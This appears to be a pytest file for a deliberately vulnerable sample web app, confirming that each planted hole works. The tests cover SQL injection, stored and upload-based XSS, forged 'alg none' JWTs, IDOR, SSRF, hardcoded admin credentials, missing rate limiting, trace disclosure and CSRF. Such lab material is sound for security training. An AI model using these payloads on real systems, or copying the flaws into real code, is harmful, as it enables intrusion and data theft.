import base64
import json

import httpx
import pytest
from fastapi.testclient import TestClient

import app as sample_app


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _jwt_none(payload: dict) -> str:
    header = {"alg": "none", "typ": "JWT"}
    header_b64 = _b64url(json.dumps(header).encode("utf-8"))
    payload_b64 = _b64url(json.dumps(payload).encode("utf-8"))
    return f"{header_b64}.{payload_b64}."


@pytest.fixture(scope="session")
def client():
    with TestClient(sample_app.app) as client:
        yield client


def test_sql_injection(client):
    resp = client.get("/api/products", params={"search": "' OR '1'='1"})
    data = resp.json()
    assert resp.status_code == 200
    assert len(data.get("products", [])) >= 10


def test_xss_stored(client):
    payload = "<img src=x onerror=alert(1)>"
    resp = client.post(
        "/api/reviews",
        data={"product_id": 1, "user_id": 2, "comment": payload},
    )
    assert resp.status_code == 200
    page = client.get("/reviews/1").text
    assert payload in page


def test_jwt_bypass(client):
    token = _jwt_none({"sub": 1, "username": "admin", "role": "admin"})
    resp = client.get(
        "/api/admin/users",
        headers={"Authorization": f"Bearer {token}", "X-Forwarded-For": "8.8.8.8"},
    )
    assert resp.status_code == 200
    assert "users" in resp.json()


def test_idor(client):
    login = client.post(
        "/api/auth/login",
        data={"username": "alice", "password": "password1"},
    ).json()
    token = login["token"]
    resp = client.get(
        "/api/orders/2",
        headers={"Authorization": f"Bearer {token}", "X-Forwarded-For": "8.8.8.8"},
    )
    assert resp.status_code == 200
    assert resp.json()["user_id"] == 3


def test_file_upload(client):
    payload = "<script>alert(1)</script>"
    files = {"file": ("pwn.html", payload, "text/html")}
    resp = client.post("/api/users/avatar", files=files)
    assert resp.status_code == 200
    url = resp.json()["url"]
    content = client.get(url).text
    assert payload in content


def test_ssrf(client, monkeypatch):
    def fake_get(url, timeout=5.0, headers=None):
        return httpx.Response(status_code=200, text='{"users":[{"id":1}]}')

    monkeypatch.setattr(sample_app.httpx, "get", fake_get)
    resp = client.post(
        "/api/image-proxy",
        data={"url": "http://internal/api/admin/users"},
    )
    assert resp.status_code == 200
    assert "users" in resp.json()["content"]


def test_hardcoded_creds(client):
    resp = client.post(
        "/api/auth/login",
        data={"username": "admin", "password": "admin123"},
    )
    assert resp.status_code == 200
    assert "token" in resp.json()


def test_no_rate_limit(client):
    for _ in range(100):
        resp = client.post(
            "/api/auth/login",
            data={"username": "admin", "password": "wrong"},
        )
        assert resp.status_code != 429


def test_info_disclosure(client):
    resp = client.get("/api/does-not-exist")
    data = resp.json()
    assert "trace" in data


def test_csrf(client):
    login = client.post(
        "/api/auth/login",
        data={"username": "alice", "password": "password1"},
    ).json()
    token = login["token"]
    resp = client.post(
        "/api/orders",
        data={"product_id": 1, "quantity": 1},
        headers={"Authorization": f"Bearer {token}", "X-Forwarded-For": "8.8.8.8"},
    )
    assert resp.status_code == 200
    assert resp.json()["status"] == "created"
